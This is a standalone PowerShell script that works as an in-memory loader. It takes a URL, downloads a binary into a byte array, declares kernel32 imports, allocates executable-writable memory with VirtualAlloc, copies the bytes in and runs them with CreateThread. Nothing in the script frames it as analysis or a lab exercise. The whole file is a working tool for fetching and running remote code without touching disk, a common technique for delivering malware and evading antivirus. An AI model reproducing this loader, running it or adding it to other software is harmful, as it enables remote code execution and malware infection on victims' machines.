param (
    [string]$Payload
)

# Function to download and execute a binary in memory
function Execute-NativeBinaryInMemory {
    param (
        [string]$Url
    )
    try {
        Write-Output "Attempting to download binary from $Url"
        # Download the binary into memory as a byte array
        $webClient = New-Object System.Net.WebClient
        $binaryData = $webClient.DownloadData($Url)
        Write-Output "Downloaded $($binaryData.Length) bytes from $Url"

        # Use Windows API to allocate memory and execute the binary
        Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        
        public class NativeExecution {
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
            
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
            
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
            
            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
        }
"@
        
        # Allocate memory for the binary
        $memSize = $binaryData.Length
        Write-Output "Allocating $memSize bytes in memory"
        $memPtr = [NativeExecution]::VirtualAlloc([IntPtr]::Zero, $memSize, 0x3000, 0x40) # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
        
        if ($memPtr -eq [IntPtr]::Zero) {
            Write-Error "Failed to allocate memory for binary. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
            return
        }
        Write-Output "Memory allocated at address: $memPtr"
        
        # Write the binary to the allocated memory
        $bytesWritten = 0
        $success = [NativeExecution]::WriteProcessMemory([IntPtr]::Zero, $memPtr, $binaryData, $memSize, [ref]$bytesWritten)
        
        if (-not $success) {
            Write-Error "Failed to write binary to memory. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
            return
        }
        Write-Output "Wrote $bytesWritten bytes to memory"
        
        # Create a thread to execute the binary in memory
        $threadId = 0
        $threadHandle = [NativeExecution]::CreateThread([IntPtr]::Zero, 0, $memPtr, [IntPtr]::Zero, 0, [ref]$threadId)
        
        if ($threadHandle -eq [IntPtr]::Zero) {
            Write-Error "Failed to create thread for execution. Error code: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
            return
        }
        Write-Output "Thread created with ID: $threadId"
        
        # Wait for the thread to complete
        [NativeExecution]::WaitForSingleObject($threadHandle, 0xFFFFFFFF)
        Write-Output "Executed native binary from $Url in memory."
    } catch {
        Write-Error "Error executing native binary in memory: $_"
    }
}

# Main logic to handle the payload
function Exec {
    param (
        [string]$Payload
    )
    Write-Output "Processing payload: $Payload"
    
    # Check if the payload is a URL (for downloading a binary)
    if ($Payload -match "^https?://") {
        # Attempt to execute as a native binary in memory
        Execute-NativeBinaryInMemory -Url $Payload
    }
    else {
        Write-Error "Unsupported payload type. Provide a URL to a binary for in-memory execution."
    }
}

# Execute the payload passed as an argument
Exec -Payload $Payload
